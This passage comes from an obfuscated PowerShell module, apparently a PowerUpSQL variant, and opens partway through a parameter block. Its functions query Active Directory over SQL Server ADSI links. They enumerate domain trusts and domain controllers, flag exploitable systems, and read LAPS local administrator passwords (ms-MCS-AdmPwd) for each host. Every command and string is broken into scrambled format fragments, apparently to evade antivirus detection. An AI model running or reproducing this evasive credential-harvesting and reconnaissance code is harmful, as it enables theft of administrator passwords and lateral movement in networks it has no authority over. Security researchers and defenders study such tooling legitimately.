        HELPmEssAgE = {"{2}{16}{18}{12}{14}{10}{6}{0}{3}{17}{7}{8}{20}{4}{11}{13}{9}{5}{15}{19}{1}" -f'ord used to au','link.','D','th','P thr','Ser','sw','t','icat','h SQL ','nt pas','ou','cc','g','ou','ver AD','omain','en',' a','SI ','e to LDA'})]
        [string]${LinK`PA`Ss`wORD},

        [Parameter(MANdatORY = ${fA`l`SE},
        heLPmESsaGE = {"{1}{2}{4}{0}{3}"-f's','Win','dows credent','.','ial'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${Cr`EDe`NT`iaL} =  $0459m2::"eM`pty",

        [Parameter(mandAToRY = ${f`Alse},
                VaLuefRoMpIPEliNeByPrOPeRtYNAME = ${t`RuE},
        hElpMesSAge = {"{1}{6}{0}{4}{3}{2}{5}"-f 'stan','SQL Server i','ecti','onn','ce to c','on to.','n'})]
        [string]${In`ST`ANCe},

        [Parameter(MANDAtOrY = ${FA`Lse},
                valUeFrompiPelinEBYPROpERtYNamE = ${T`RuE},
        hElpMeSSaGe = {"{1}{4}{5}{2}{3}{0}"-f 'r.','Domain','ter ','fo',' group',' to fil'})]
        [string]${fiLTErG`RO`Up},

        [Parameter(MAndaTOry = ${f`A`LSE},
        HELPMESsage = {"{1}{10}{31}{25}{19}{28}{30}{29}{11}{23}{14}{18}{13}{3}{24}{5}{27}{8}{17}{16}{15}{20}{6}{32}{21}{12}{9}{0}{22}{4}{2}{26}{7}" -f'ti','Use','dhoc qu','link option (d','a','ault) wi','p','RowSet.',' ADSI serve',' op',' ad','cuti','AdHoc','f a server link.  The ','nste','ink',' l','r','ad o','onnec',' and use O','Query. The ','on will enable ','ng the query i','ef',' c','eries, and use Open','ll create an','tion f','exe','or ','hoc','en'})]
        [Switch]${use`AD`hoc},

        [Parameter(MANdatoRY = ${F`AlSE},
        VALuEfROMpIpELInebYPRoPertYnaMe = ${T`RUE},
        heLPMesSagE = {"{0}{1}{2}{3}" -f 'Do','m','ain',' to query.'})]
        [string]${TARGeTD`Om`AIn},

        [Parameter(MAndatoRy = ${F`A`lSe},
        hElpmEssaGE = {"{3}{7}{2}{6}{9}{5}{10}{8}{4}{1}{0}" -f 'apped.','wr','rbose err','Suppress v','s ','n functi','ors.  Use','e','i','d whe','on '})]
        [switch]${sUPpre`sSvE`RB`o`Se}
    )

    Begin
    {
        
        if(-not ${INS`T`AncE})
        {
            ${i`NsTa`N`ce} = ${eN`V:cOM`PuTeR`N`AMe}
        }

        
        if((-not ${FI`l`TerGROUp})){
            ${F`iltE`RGrO`Up} = '*'
        }
    }

    Process
    {
        
        if(${U`S`EADHOc}){
            &("{3}{0}{4}{2}{1}" -f'ainOb','t','c','Get-SQLDom','je') -Verbose -Instance ${I`NStAN`ce} -Username ${use`RnAME} -Password ${pa`SSw`oRD} -LinkUsername ${l`InKUS`erN`Ame} -LinkPassword ${linKPas`SWo`Rd} -LdapPath ${TA`R`geTdoM`A`In} -LdapFilter "(&(objectClass=Group)(SamAccountName=$FilterGroup))" -LdapFields ("{1}{9}{0}{7}{3}{6}{8}{2}{4}{5}" -f'c','sam','unt,whencrea','me,','ted,whenchang','ed,adspath','adminC','countna','o','a') -UseAdHoc            
        }else{
            &("{3}{0}{2}{1}"-f 'm','ject','ainOb','Get-SQLDo') -Verbose -Instance ${InS`TaNCe} -Username ${uS`e`RNA`ME} -Password ${PA`S`SWORd} -LinkUsername ${LI`Nku`seRn`AME} -LinkPassword ${linKp`A`ssWorD} -LdapPath ${TA`Rge`TdOmA`In} -LdapFilter "(&(objectClass=Group)(SamAccountName=$FilterGroup))" -LdapFields ("{10}{4}{6}{3}{5}{2}{8}{1}{7}{9}{0}"-f'hanged,adspath','w','ncreate','ount,wh','maccountnam','e','e,adminC','he','d,','nc','sa')            
        }
    }

    End
    {               
    }
}





Function  Get-SQl`dOMAI`NTR`U`st
{
    
    [CmdletBinding()]
    Param(
        [Parameter(maNdAtORY = ${FaL`sE},
        HelpmEsSAgE = {"{0}{6}{1}{4}{2}{3}{5}{7}{10}{8}{9}" -f 'SQL Serv','mai',' ','to ','n account','authenticate t','er or do','o SQL','er','ver.',' S'})]
        [string]${u`sernAme},

        [Parameter(MANdatOry = ${Fa`LSe},
        hElpMESSAGe = {"{11}{3}{10}{8}{5}{2}{0}{1}{7}{9}{12}{4}{6}"-f 'rd to a','ut',' passwo','L Server or','o','t',' SQL Server.','henti','in accoun','cat',' doma','SQ','e t'})]
        [string]${Pa`S`SWord},

        [Parameter(manDAtOrY = ${Fa`l`Se},
        helPmEssAgE = {"{7}{10}{4}{3}{1}{8}{5}{9}{11}{2}{6}{0}{12}"-f' ADSI link',' au','gh S','unt used to',' acco',' LDAP t','QL Server','D','thenticate to','hro','omain','u','.'})]
        [string]${LI`NkU`SeRN`Ame},

        [Parameter(MaNdaTORy = ${Fa`l`se},
        hELpMESsagE = {"{6}{2}{11}{9}{8}{3}{12}{5}{10}{0}{4}{1}{7}"-f 'rough SQL','erve','omain ','d to aut',' S','at','D','r ADSI link.','assword use','ccount p','e to LDAP th','a','hentic'})]
        [string]${lin`KpAs`sW`OrD},

        [Parameter(MaNDatOrY = ${f`Al`Se},
        HElpMessaGE = {"{2}{3}{1}{0}{4}" -f'ent','red','Windows ','c','ials.'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${cr`E`d`ential} =  (get-cHIlditeM  VARIablE:0459M2 ).valuE::"E`mptY",

        [Parameter(maNDaTORy = ${FAL`Se},
                VAlueFROmpipEliNEbyproPeRtyName = ${T`Rue},
        HeLPmesSAGE = {"{0}{10}{7}{6}{8}{1}{9}{4}{5}{2}{3}"-f 'SQL','o c','n to','.','cti','o','ance ','nst','t','onne',' Server i'})]
        [string]${iNsta`N`ce},

        [Parameter(maNdaTORY = ${F`A`LSE},
        heLpMessaGE = {("{53}{46}{28}{30}{36}{40}{49}{56}{59}{32}{52}{17}{60}{5}{26}{2}{27}{25}{29}{34}{7}{19}{33}{3}{15}{41}{51}{4}{8}{45}{1}{10}{31}{22}{20}{57}{55}{47}{11}{58}{43}{21}{0}{38}{18}{6}{44}{23}{24}{16}{39}{50}{48}{61}{42}{13}{9}{12}{35}{54}{14}{37}"-f 'opt','DSI ',' of','lt) ','e an','st','ill enabl','i',' ','s','se','he','e','d u','RowSe','wil','o','ry ','n w','on (','link an',' ','er ','d','h','ink.  ','ead',' a server l','dh','The link o','oc ','rv','uting the qu','defau','pt',' ','conne','t.','io','c ','ctio','l cr',' an','AdHoc','e a','A',' a',' OpenQuery. T','s','n','querie','eat','e','Use','Open','se',' for ','d u',' ','exec','in',',')})]
        [Switch]${usEa`dH`OC},

        [Parameter(mANdAtORY = ${fAl`Se},
        valuEFRompipELINebYprOperTynAme = ${t`RuE},
        heLPMEssAGE = {"{2}{3}{0}{4}{1}"-f 'o ','ery.','D','omain t','qu'})]
        [string]${TArGe`TDo`mA`iN},

        [Parameter(maNDATORy = ${fal`sE},
        hElPmeSSaGE = {"{14}{3}{7}{13}{8}{10}{16}{6}{1}{9}{2}{12}{11}{0}{15}{4}{5}" -f'ncti',' Used w','en','press verbos','s',' wrapped.',' ','e','e','h','r','fu',' ',' ','Sup','on i','rors.'})]
        [switch]${SupPReSs`Verb`osE}
    )

    Begin
    {
        
        if(-not ${I`NstanCE})
        {
            ${I`NS`TanCE} = ${eNv:c`om`pUT`e`RnAMe}
        }
        ${tblTRU`S`TS} = &("{2}{0}{1}" -f'ec','t','New-Obj') ("{6}{3}{5}{2}{4}{1}{0}"-f'able','.DataT','Dat','s','a','tem.','Sy')
        ${t`BLtr`UsTs}."C`olu`mnS".("{1}{0}"-f'dd','A').Invoke(("{3}{1}{0}{2}"-f'd','e','Domain','Trust')) | &("{1}{2}{0}" -f't-Null','O','u')
        ${tbL`T`RUstS}."coL`UmnS".("{0}{1}"-f'A','dd').Invoke(("{4}{2}{3}{1}{0}" -f'n','ainD','u','stedDom','Tr')) | &("{2}{1}{0}" -f 'll','t-Nu','Ou')
        ${tBL`T`RUstS}."COLU`M`NS".("{0}{1}"-f 'Ad','d').Invoke(("{0}{1}"-f'Tr','usttype')) | &("{2}{0}{1}" -f't','-Null','Ou')
        ${TBLtr`U`s`Ts}."COL`UMns".("{0}{1}"-f 'A','dd').Invoke(("{3}{0}{1}{2}" -f'tdire','c','tion','Trus')) | &("{0}{1}"-f'Out-N','ull')
        ${TblT`R`UsTS}."c`OlUM`Ns".("{0}{1}" -f 'A','dd').Invoke(("{0}{2}{3}{1}" -f'Trustattr','s','ibu','te')) | &("{0}{1}{2}"-f'Out','-','Null')
        ${tbLtR`U`sTS}."cO`LUMnS".("{0}{1}"-f'Ad','d').Invoke(("{1}{3}{2}{0}"-f 'eated','W','cr','hen')) | &("{1}{0}"-f'll','Out-Nu')
        ${T`B`LtRUS`TS}."cOl`UMnS".("{0}{1}" -f'A','dd').Invoke(("{2}{1}{3}{0}" -f 'd','chan','When','ge')) | &("{1}{0}" -f 'll','Out-Nu')
        ${Tb`L`TrusTs}."cO`lu`mnS".("{1}{0}" -f 'd','Ad').Invoke(("{1}{2}{0}" -f 'lass','O','bjectc')) | &("{0}{2}{1}" -f 'Ou','l','t-Nul')
        ${tbL`TRUS`Ts}.("{1}{0}" -f'lear','C').Invoke()
    }

    Process
    {
        
        if(${u`SEAD`hOC}){
            ${reSU`lT} = &("{5}{1}{4}{3}{0}{2}" -f 'j','-SQL','ect','b','DomainO','Get') -Verbose -Instance ${inSt`An`cE} -Username ${U`sEr`NamE} -Password ${pAs`sW`OrD} -LinkUsername ${LIn`K`U`sE`RNAme} -LinkPassword ${LINkp`A`SS`WoRD} -LdapPath ${tARG`et`DO`main} -LdapFilter ("{3}{2}{5}{0}{6}{1}{7}{4}"-f'ctClas','te','ob','(','in)','je','s=trus','dDoma') -LdapFields ("{1}{28}{0}{13}{3}{27}{21}{26}{23}{7}{5}{22}{9}{17}{11}{10}{15}{25}{4}{14}{24}{12}{18}{6}{2}{19}{16}{8}{20}" -f'tpartn','tr','he','r','di','hedname',',w','s','d,adspat','u','t','type,','utes,','e','rection,trusta','rus','ange','st','whencreated','nch','h','dis',',tr','i','ttrib','t','tingu',',','us') -UseAdHoc            
        }else{
            ${r`ESU`lT} = &("{2}{1}{0}{3}" -f 'ma','t-SQLDo','Ge','inObject') -Verbose -Instance ${i`NSTA`NCE} -Username ${usE`Rn`AmE} -Password ${p`AsSW`oRD} -LinkUsername ${liNk`USE`RNAmE} -LinkPassword ${link`pAS`sWoRd} -LdapPath ${TArgeT`d`OmaiN} -LdapFilter ("{2}{1}{8}{4}{3}{7}{0}{5}{6}"-f'ma','ectCla','(obj','edD','st','i','n)','o','ss=tru') -LdapFields ("{9}{10}{12}{3}{17}{15}{5}{27}{25}{6}{22}{13}{11}{7}{16}{26}{8}{0}{18}{1}{19}{4}{14}{24}{21}{23}{28}{20}{2}"-f 'ri','s,w','d,adspath','tpartner,d','ated,','is','trusttyp','rustdirect','t','t','ru','t','s',',','w','ngu','io','isti','bute','hencre','e','ch','e','a','hen','dname,','n,trustat','he','ng')            
        }

        ${RE`SULT} | &("{2}{0}{1}"-f'je','ct','ForEach-Ob') {

            
            ${t`RUStDIR`e`Ct`Ion} = Switch (${_}."T`RUS`TdiR`EcTi`on") {
                0 { ("{2}{0}{1}"-f'sable','d','Di') }
                1 { ("{0}{2}{1}"-f'I','bound','n') }
                2 { ("{2}{1}{0}"-f'bound','ut','O') }
                3 { ("{3}{2}{0}{1}{4}"-f 'tion','a','ec','Bidir','l') }
            }

            
            ${tR`UsTaT`TrIb} = Switch (${_}."TrUs`Ta`T`TriB`UTes"){
                0x001 { ("{0}{4}{2}{3}{1}" -f 'non_','tive','s','i','tran') }
                0x002 { ("{0}{1}{3}{2}" -f'up','l','only','evel_') }
                0x004 { ("{2}{3}{0}{1}"-f'_doma','in','quara','ntined') }
                0x008 { ("{4}{2}{1}{5}{0}{3}"-f'ns','est_t','r','itive','fo','ra') }
                0x010 { ("{3}{2}{0}{1}" -f'_org','anization','s','cros') }
                0x020 { ("{0}{1}{3}{2}" -f'w','ithin_fo','st','re') }
                0x040 { ("{5}{4}{1}{0}{3}{2}" -f'n','_as_exter','l','a','t','trea') }
                0x080 { ("{0}{3}{4}{1}{2}"-f 'tr','ncryp','tion','ust_uses_r','c4_e') }
                0x100 { ("{4}{3}{1}{5}{0}{2}" -f 's_aes_','us','keys','_','trust','e') }
                Default {                 
                    ${_}."TRuSTaT`T`RibuTES"
                }
            }

            
            
            ${TrU`s`TTyPE} = Switch (${_}."tRuST`TYpE"){
                1 {("{6}{3}{9}{4}{8}{0}{2}{1}{7}{5}"-f 'ws NT do','in ex','ma','l Trust (W','d','rnal)','Downleve','te','o','in')}
                2 {("{3}{11}{10}{13}{5}{2}{7}{12}{9}{1}{6}{4}{15}{8}{0}{14}" -f'r forest','oma',' Directory domai','Uplev','sh','e','in, ','n - par','xternal, o','t-child, root d','Tru','el ','en','st (Activ',')','ortcut, e')}
                3 {("{3}{4}{9}{2}{1}{6}{0}{7}{8}{5}" -f'on ','os ','ows Kerber','M','IT (no','m)','versi','5 ','real','n-Wind')}
                4 {((("{6}{22}{12}{16}{4}{0}{18}{14}{3}{5}{17}{21}{10}{2}{23}{15}{11}{13}{7}{9}{8}{19}{20}{1}" -f'ca','uting)','s t','t','i','rust ','DC','roup2u','tributed ','ls Dis','r','en','T',' G',' ',' Op','heoret','typ','l','C','omp','e - DCE refe','E (','o'))  -rEpLACE '2ul',[cHAr]39)}
            }

            
            ${TBLtr`U`s`TS}."r`OWS"."A`Dd"(
                [string]${_}."T`RUs`TP`ARtnEr",
                [string]${_}."DisTiN`G`UI`sH`ED`NAme",
                [string]${Tr`USt`TypE},
                [string]${tRUS`Td`ir`e`CtioN},
                [string]${tRUStAT`T`Rib},
                [string]${_}."WHeNcR`e`At`ed",
                [string]${_}."W`HENC`HA`NGeD",
                [string]${_}."ObJ`eCtcl`Ass"
            ) | &("{2}{0}{1}"-f 'ut-Nul','l','O')

        }

        ${tBl`T`RU`sts}
    }

    End
    {               
    }
}





Function  ge`T-SQ`ldOmAinp`AsSW`o`Rdslaps
{
    
    [CmdletBinding()]
    Param(
        [Parameter(maNDAtoRY = ${f`A`lSe},
        helPmeSSAGE = {"{7}{3}{2}{5}{6}{4}{0}{8}{1}{9}" -f'o SQL ','r',' to a','ount','t','u','thenticate ','SQL Server or domain acc','Serve','.'})]
        [string]${Us`Ern`AMe},

        [Parameter(mAnDatorY = ${Fal`sE},
        HelpMEssAGE = {"{11}{2}{13}{7}{4}{12}{3}{8}{9}{5}{0}{14}{1}{6}{10}" -f 'cate','Se','ver','t ','n ac','uthenti','rver','or domai','passw','ord to a','.','SQL Ser','coun',' ',' to SQL '})]
        [string]${pASS`wo`Rd},

        [Parameter(MAndAToRy = ${fA`L`sE},
        HELpMessage = {"{0}{5}{12}{1}{10}{4}{13}{9}{8}{6}{11}{3}{7}{2}"-f'Dom',' authe','DSI link.',' ','tica','ain ac',' Ser','A',' through SQL',' to LDAP','n','ver','count used to','te'})]
        [string]${lInkus`erNA`me},

        [Parameter(MAnDaToRY = ${F`AlSe},
        HELPmessAgE = {"{6}{16}{19}{0}{15}{11}{21}{14}{1}{4}{2}{9}{3}{7}{13}{17}{5}{10}{12}{20}{8}{18}" -f'd','cate',' LDAP throug','SQL S',' to',' A','D','e',' li','h ','D','authe','S','rve','ti',' to ','omain account password u','r','nk.','se','I','n'})]
        [string]${lInKP`AssW`ORd},

        [Parameter(MANDAToRy = ${Fa`L`se},
        HElPMESsaGE = {"{2}{5}{1}{0}{3}{4}"-f' c','ws','Wind','reden','tials.','o'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${C`ReDE`NtIaL} =   $0459M2::"EmP`TY",

        [Parameter(mANdAToRY = ${fa`l`SE},
                vALUEfroMPIPELINEbYpROpertYNamE = ${T`RuE},
        heLPmESsagE = {"{0}{4}{7}{8}{6}{5}{3}{9}{10}{2}{1}"-f'SQ','ection to.','onn','nsta','L','r i','e',' Ser','v','nce t','o c'})]
        [string]${I`Nst`A`NcE},

        [Parameter(mandAtory = ${fA`lsE},
        heLPMESsage = {("{14}{12}{20}{32}{6}{27}{40}{4}{31}{37}{15}{39}{21}{33}{23}{38}{25}{44}{22}{36}{41}{8}{13}{42}{5}{24}{11}{34}{2}{35}{1}{30}{18}{29}{19}{17}{0}{26}{3}{10}{45}{9}{43}{28}{7}{16}" -f' will e','en','nk an','ad',' i','ea','ecut','Ro','fault) ','es','h','e a','dhoc ','wil','Use a','ad','wSet.','ption','Th','c o','connec','of ','ink ',' se','t','ink. ','nable ','in',' use Open','e AdHo','Query. ','n','tion for ex','a','n ADSI server li','d use Op','option (','ste','rver l',' ','g the query','de','l cr',', and',' The l','oc queri')})]
        [Switch]${U`SE`A`Dhoc},

        [Parameter(manDaTorY = ${FA`lse},
        VaLUEfRompiPELiNebYPROpertyNAmE = ${tr`Ue},
        heLpmesSagE = {"{3}{4}{1}{2}{0}" -f 'ery.','n',' to qu','Do','mai'})]
        [string]${ta`RGEtDOm`A`In},

        [Parameter(MaNdAtOrY = ${fAl`Se},
        heLPmeSsaGe = {"{3}{1}{7}{4}{6}{2}{5}{8}{9}{0}"-f 'd.','s verbose err','h','Suppres','s.  Use','en funct','d w','or','ion is w','rappe'})]
        [switch]${sUp`preSs`VE`RbOSE}
    )

    Begin
    {
        
        if(-not ${INs`TA`NCe})
        {
            ${INsT`An`cE} = ${ENV`:c`OmPu`T`ERNamE}
        }

        ${T`A`BlELapS} = &("{1}{0}{2}" -f'w-Ob','Ne','ject') ("{3}{0}{4}{2}{1}" -f 'stem.Da','le','taTab','Sy','ta.Da') 
        ${t`AbL`ELaPs}."COl`UMns".("{1}{0}" -f 'd','Ad').Invoke(("{1}{0}" -f 'stname','Ho')) | &("{1}{0}{2}"-f 't-Nu','Ou','ll')
        ${t`A`B`LElaPS}."COl`UMNs".("{1}{0}"-f'd','Ad').Invoke(("{1}{0}{2}" -f 'o','Passw','rd')) | &("{1}{2}{0}"-f'Null','O','ut-')
        ${tA`Ble`laPs}.("{0}{1}" -f 'Cl','ear').Invoke()
    }

    Process
    {
        
        if(${usE`A`dhoc}){
            ${REs`ULT} = &("{4}{1}{0}{2}{5}{3}"-f 'omai','et-SQLD','n','bject','G','O') -Verbose -Instance ${InS`T`AncE} -Username ${UsErnA`mE} -Password ${PA`SS`wOrd} -LinkUsername ${LiNK`UsErn`AMe} -LinkPassword ${Li`N`KP`A`SswORd} -LdapPath ${ta`Rg`EtDOM`AIn} -LdapFilter (("{4}{2}{0}{3}{1}"-f'u',')','mp','ter','(objectCategory=Co')) -LdapFields ("{0}{6}{5}{7}{3}{1}{2}{4}" -f'dnsho','C','S-','-M','AdmPwd,adspath','nam','st','e,ms') -UseAdHoc            
        }else{
            ${RE`SULT} = &("{4}{0}{3}{1}{2}" -f'm','inOb','ject','a','Get-SQLDo') -Verbose -Instance ${In`StanCE} -Username ${U`SE`R`Name} -Password ${PA`Ssw`O`RD} -LinkUsername ${LINK`US`eRnAME} -LinkPassword ${LIn`kpa`ss`WoRD} -LdapPath ${T`A`RgE`TdOmAin} -LdapFilter (("{3}{5}{1}{4}{2}{0}"-f'r)','gory=','e','(o','Comput','bjectCate')) -LdapFields ("{1}{3}{4}{5}{2}{6}{9}{7}{0}{8}"-f'spa','dnsh','e,ms-M','ost','n','am','C','AdmPwd,ad','th','S-')            
        }
        
        ${RE`sult} | &("{4}{1}{0}{2}{3}"-f'Each-Ob','r','jec','t','Fo') {
            ${cURRe`NTHO`St} = ${_}."DnSH`oSTn`AME"
            ${c`U`RRENtPA`s`swOrD} = ${_}.'ms-MCS-AdmPwd'

            
            if ([string]${C`U`Rren`T`PaSSWOrd})
            {
                
                ${T`AbLE`lAPS}."Ro`WS".("{1}{0}" -f'dd','A').Invoke(${CurR`eNT`h`osT},${Cu`R`R`Ent`PaSSWORD}) | &("{2}{0}{1}" -f 'ut','-Null','O')
            }
        }
        
        ${T`ABLel`A`ps}
            
    }

    End
    {               
    }
}





Function  gE`T-sqldomai`NcO`NtRoL`l`eR
{
    
    [CmdletBinding()]
    Param(
        [Parameter(MANDatorY = ${f`Al`SE},
        helpMESSAGE = {"{11}{10}{7}{3}{4}{2}{1}{6}{9}{8}{5}{0}" -f ' Server.',' ','main',' or d','o','cate to SQL','account t','r','authenti','o ','erve','SQL S'})]
        [string]${uSeR`Na`me},

        [Parameter(ManDAToRy = ${F`ALsE},
        HeLPMEsSaGe = {"{8}{14}{16}{10}{6}{12}{2}{17}{5}{11}{15}{7}{1}{4}{3}{9}{0}{13}"-f' t',' ','c','t','au','t passwo','r ',' to','SQ','henticate','rver o','r','domain a','o SQL Server.','L','d',' Se','coun'})]
        [string]${pASS`wo`Rd},

        [Parameter(mAnDAtOrY = ${fa`lSE},
        HelPMEssAge = {"{4}{14}{16}{9}{6}{18}{12}{0}{13}{11}{5}{15}{7}{1}{10}{3}{8}{17}{2}" -f'uthe','ough SQL Serv','k.','r ADSI','Domain',' to L','use','hr',' ',' ','e','ate','to a','ntic',' ac','DAP t','count','lin','d '})]
        [string]${lInKUSE`R`NamE},

        [Parameter(mANdAToRy = ${fA`LSE},
        hELPmESsAge = {"{12}{7}{4}{6}{11}{5}{1}{9}{0}{3}{8}{2}{10}{13}" -f 'icate','e','ugh ',' to LDAP thr','in acc',' to auth','ount ','oma','o','nt','SQL S','password used','D','erver ADSI link.'})]
        [string]${LINkPas`Sw`O`RD},

        [Parameter(mAndATORy = ${fA`lsE},
        HeLPMEsSAge = {"{4}{3}{5}{0}{2}{1}"-f're','ials.','dent','ndo','Wi','ws c'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${cRedEN`T`i`AL} =  ( gEt-VArIAbLe  0459m2  ).vaLUE::"Em`pty",

        [Parameter(mAnDAtOrY = ${Fa`LsE},
                valueFROmPiPEliNEbYPRopERtynAME = ${tR`UE},
        HeLpmesSAgE = {"{4}{2}{6}{1}{0}{3}{5}" -f 'ectio','nn','ver instance','n t','SQL Ser','o.',' to co'})]
        [string]${INS`TANce},

        [Parameter(maNdaTory = ${fa`L`Se},
        HeLPmessaGE = {"{21}{15}{1}{41}{48}{6}{10}{45}{35}{18}{46}{40}{2}{39}{7}{49}{23}{44}{19}{3}{14}{17}{36}{16}{25}{26}{27}{13}{5}{20}{29}{22}{38}{34}{30}{43}{8}{9}{4}{12}{33}{11}{28}{42}{37}{31}{24}{32}{47}{0}"-f'.',' connection f','f a','n (d','l en','se O','ecu','er ',' ','wil','t','adho','a','and u','efa',' adhoc','te an ADSI se','ult) will cre','query','ink optio','pen','Use','ery','e ','enRo','rver li','n','k ','c q','Qu','pt','p','wSe','ble ','e AdHoc o','the ','a','se O','. Th',' serv','nstead o','or e','ueries, and u','ion','l','ing ',' i','t','x','link.  Th'})]
        [Switch]${u`seaD`hoC},

        [Parameter(MANdatoRY = ${FA`lsE},
        valUEFroMpIpeLINEBypRoPeRTyNAMe = ${tR`Ue},
        hELPmESsAge = {"{4}{0}{3}{1}{2}"-f'main ','quer','y.','to ','Do'})]
        [string]${tARGe`Td`O`m`AiN},

        [Parameter(mandATORy = ${F`AlSE},
        hElpmESSaGE = {"{2}{5}{1}{4}{10}{3}{11}{9}{0}{7}{12}{6}{13}{8}{14}"-f '.  ','e','S','r','ss ','uppr','on is wr','Used when funct','p','rrors','ve','bose e','i','a','ped.'})]
        [switch]${S`UppReSSvE`RbO`SE}
    )

    Begin
    {
        
        if(-not ${I`NS`TaNce})
        {
            ${INs`T`AN`CE} = ${ENv:C`O`mputERn`A`Me}
        }
    }

    Process
    {
        
        if(${usea`DhOC}){
            &("{1}{0}{4}{2}{5}{6}{3}"-f'-','Get','ain','t','SQLDom','Obje','c') -Verbose -Instance ${InS`TAn`cE} -Username ${USe`RNA`Me} -Password ${P`A`sSwoRD} -LinkUsername ${Lin`kuseRna`ME} -LinkPassword ${LIn`k`pASsW`Ord} -LdapPath ${TaR`G`Et`D`OMain} -LdapFilter ("{6}{2}{13}{10}{12}{9}{1}{0}{3}{8}{5}{4}{14}{7}{11}"-f't','ntCon','ec','rol:','6.1.4.','55','(&(obj','2)','1.2.840.113','u','=computer)(',')','userAcco','tCategory','803:=819') -LdapFields ("{12}{14}{8}{3}{7}{9}{21}{25}{26}{24}{17}{23}{20}{2}{16}{0}{1}{6}{11}{15}{5}{22}{13}{10}{4}{18}{19}" -f'ope','ra','sio','dnshostna','n','mserv','tingsy','m','me,','e,opera','k,whencha','s','n','ac','a','te','n,','gsys','ged,log','oncount','mver','t','icep','te','ratin','ingsystem,','ope') -UseAdHoc            
        }else{
            &("{2}{0}{1}{3}"-f 't','-SQLDoma','Ge','inObject') -Verbose -Instance ${i`NsTAN`ce} -Username ${uSe`RnA`mE} -Password ${P`ASSW`orD} -LinkUsername ${LI`NKuseRNa`me} -LinkPassword ${lINkp`AsS`worD} -LdapPath ${t`ArgetD`o`m`AIN} -LdapFilter (("{2}{15}{14}{7}{3}{22}{4}{17}{6}{0}{18}{9}{19}{16}{5}{20}{8}{11}{21}{1}{12}{13}{10}" -f'e','4','(&(obj','ry=','puter)','ol:1','us','go','.840.1135','Co','8192))','56','.8','03:=','ate','ectC','tr','(','rAccount','n','.2','.1.','com')) -LdapFields ("{14}{16}{8}{2}{3}{15}{4}{6}{13}{1}{7}{10}{5}{9}{12}{0}{11}"-f'cepack,whenchanged,logonco','atingsystemver',',ope','r','gsys','n,oper','tem,o','si','tname','atingsy','o','unt','stemservi','per','name,dns','atin','hos')            
        }

    }

    End
    {               
    }
}





Function  geT-`S`Q`L`domaIN`e`x`PL`OITABLesYStEM
{
    
    [CmdletBinding()]
    Param(
        [Parameter(maNdAToRy = ${f`ALsE},
        helPMesSage = {"{9}{7}{5}{4}{2}{3}{10}{6}{0}{1}{8}"-f 't','o SQL Serv','in a','c','er or doma','v','e ','er','er.','SQL S','count to authenticat'})]
        [string]${uSE`R`NAMe},

        [Parameter(MAnDAtorY = ${F`A`Lse},
        heLPMessAge = {"{6}{5}{3}{10}{2}{11}{7}{8}{12}{9}{1}{4}{0}"-f'te to SQL Server.','ntic','om','erver or','a','L S','SQ','ccount passwo','r','to authe',' d','ain a','d '})]
        [string]${P`AssWo`Rd},

        [Parameter(maNdATORy = ${fa`LSE},
        hElPmEsSage = {"{12}{14}{6}{16}{17}{4}{11}{2}{1}{13}{10}{0}{9}{15}{8}{5}{7}{3}"-f'o LD','c','uthenti','er ADSI link.','t',' SQL','in ac',' Serv','ugh','AP thr','te t','o a','Dom','a','a','o','count ','used '})]
        [string]${LInk`U`sern`AME},

        [Parameter(MaNDatorY = ${FA`L`SE},
        HeLPMesSaGe = {"{4}{7}{16}{10}{12}{2}{11}{6}{15}{3}{13}{0}{5}{17}{18}{8}{1}{22}{9}{19}{21}{14}{20}" -f 'te to LDAP through','er','t p','n','D',' SQL','sw','omain','rv','D','ac','as','coun','tica','nk','ord used to authe',' ',' S','e','SI','.',' li',' A'})]
        [string]${lin`kPAs`sWO`RD},

        [Parameter(manDaTorY = ${F`A`LSE},
        HeLpMeSsAgE = {"{1}{5}{4}{2}{3}{0}"-f's.','W','enti','al','dows cred','in'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${CRe`d`E`NtiaL} =   $0459m2::"eMp`Ty",

        [Parameter(mAnDatoRy = ${F`Al`SE},
                vALUEFrompiPelineByPROpErTynAMe = ${tR`UE},
        HELpMesSagE = {"{5}{4}{1}{3}{0}{6}{2}"-f 'stance to co','Serve','ion to.','r in',' ','SQL','nnect'})]
        [string]${INs`Ta`NCE},

        [Parameter(mANDAToRY = ${fA`LSe},
        hElpMesSaGe = {"{42}{10}{28}{21}{3}{46}{23}{47}{29}{5}{37}{26}{2}{44}{30}{39}{13}{0}{31}{14}{45}{20}{1}{15}{38}{17}{24}{35}{40}{32}{18}{22}{43}{12}{8}{36}{16}{9}{34}{4}{11}{6}{19}{25}{7}{33}{41}{27}"-f 'k ','ll creat','of a','hoc co','e','e que','nd','se','ll ','c','se ','s, a','he AdHoc option wi','n',' (de','e ',' adho','DSI server','n',' ','ault) wi','d','Query','nection for execut',' lin','u','stead ','Set.','a',' th','  The l','option','pe',' ',' queri','k a','enable','ry in','an A','i','nd use O','OpenRow','U','. T',' server link.','f','n','ing'})]
        [Switch]${Us`E`ADHoc},

        [Parameter(MAndatory = ${FA`lSE},
        vAluEFRomPIpeliNebyPRoPeRtYnAme = ${TR`UE},
        hELPmessage = {"{2}{1}{3}{0}"-f ' query.','omain ','D','to'})]
        [string]${T`A`RGET`doMaIN},

        [Parameter(mandatORY = ${F`AL`Se},
        HeLpMEsSagE = {"{8}{3}{7}{11}{9}{13}{4}{1}{2}{12}{10}{5}{0}{6}" -f 's w',' Use','d whe','ess','rs. ','n i','rapped.',' v','Suppr','rbose er',' functio','e','n','ro'})]
        [switch]${sup`Pre`SsveRBo`SE}
    )

    Begin
    {
        
        if(-not ${inSTA`Nce})
        {
            ${iN`S`TanCE} = ${e`NV:Com`PuTerNa`mE}
        }
        
        
        ${T`Ab`leEX`PLoITS} = &("{2}{1}{0}"-f'Object','w-','Ne') ("{3}{1}{0}{4}{2}" -f't','.Da','able','System','a.DataT') 
        ${T`ABlEEX`PLoIts}."COlu`mNs".("{0}{1}"-f'A','dd').Invoke(("{2}{1}{0}{4}{3}"-f'ating','r','Ope','tem','Sys')) | &("{2}{0}{1}"-f 'l','l','Out-Nu') 
        ${t`AblE`EXPL`oitS}."CoL`Umns".("{1}{0}" -f'dd','A').Invoke(("{2}{1}{0}{3}"-f'ePa','ervic','S','ck')) | &("{2}{1}{0}"-f 'ull','N','Out-')
